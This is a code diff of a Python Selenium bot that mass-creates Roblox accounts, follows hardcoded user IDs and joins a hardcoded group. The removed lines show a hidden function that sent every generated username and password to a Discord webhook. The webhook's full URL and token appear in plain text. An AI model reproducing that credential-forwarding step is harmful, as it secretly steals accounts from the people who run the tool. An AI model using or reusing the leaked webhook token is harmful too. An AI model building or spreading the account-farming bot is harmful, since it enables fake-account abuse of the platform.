@@ -9,7 +9,6 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.service import Service
 import threading
-import requests
 
 # Define the ASCII art
 ascii = f"""
@@ -24,10 +23,10 @@ options = webdriver.ChromeOptions()
 options.add_experimental_option("detach", True)
 options.add_argument(f"--window-size={window_size[0]},{window_size[1]}")
 
-# Replace with the Roblox user IDs you want to follow
+
 TARGET_USER_IDS = ['3419127828', '6601680']
 
-# Replace with the Roblox group ID you want to join
+
 GROUP_ID = '34038912'
 
 class RobloxAccountCreator:
@@ -103,7 +102,6 @@ class RobloxAccountCreator:
 
                 self.fill_registration_form(driver, random_username, random_password)
                 self.save_account_to_file(random_username, random_password)
-                self.notify_webhook(random_username, random_password)
 
                 # Click the sign-up button
                 sign_button = driver.find_element(By.XPATH, "//*[@id='signup-button']")
@@ -204,27 +202,6 @@ class RobloxAccountCreator:
             file.write(f"Username: {username}, Password: {password}\n")
         print(f"Saved account details to file: Username: {username}, Password: {password}")
 
-    def notify_webhook(self, username, password):
-        hook_url = 'https://discord.com/api/webhooks/1387937396397441094/HSmrZrvJJtbJ1iEbxLe0R8e_kAh6_j_9Yd4v1JLKlye93oylDn8dC8xapmOmWSjXGTvb'
-        message = f"New Roblox account created:\nUsername: {username}\nPassword: {password}"
-        payload = {'content': message}
-        requests.post(hook_url, json=payload)
-        print(f"Sent account details to webhook: Username: {username}, Password: {password}")
-
-    def Gender1(self, driver):
-        try:
-            gender_button = driver.find_element(By.XPATH, "//*[@id='MaleButton']")
-            gender_button.click()
-        except Exception as e:
-            print(f"Error selecting male gender: {e}")
-
-    def Gender2(self, driver):
-        try:
-            gender_button = driver.find_element(By.XPATH, "//*[@id='FemaleButton']")
-            gender_button.click()
-        except Exception as e:
-            print(f"Error selecting female gender: {e}")
-
     def open_discord(self):
         url = "https://discord.gg/Pkqcc2Wf72"
         webbrowser.open(url)
@@ -270,6 +247,20 @@ class RobloxAccountCreator:
             time.sleep(2)
         except Exception as e:
             print(f"Error joining group ID {group_id}: {e}")
+
+    def Gender1(self, driver):
+        try:
+            gender_button = driver.find_element(By.XPATH, "//*[@id='MaleButton']")
+            gender_button.click()
+        except Exception as e:
+            print(f"Error selecting male gender: {e}")
+
+    def Gender2(self, driver):
+        try:
+            gender_button = driver.find_element(By.XPATH, "//*[@id='FemaleButton']")
+            gender_button.click()
+        except Exception as e:
+            print(f"Error selecting female gender: {e}")
 
 # Create the GUI
 root = tk.Tk()
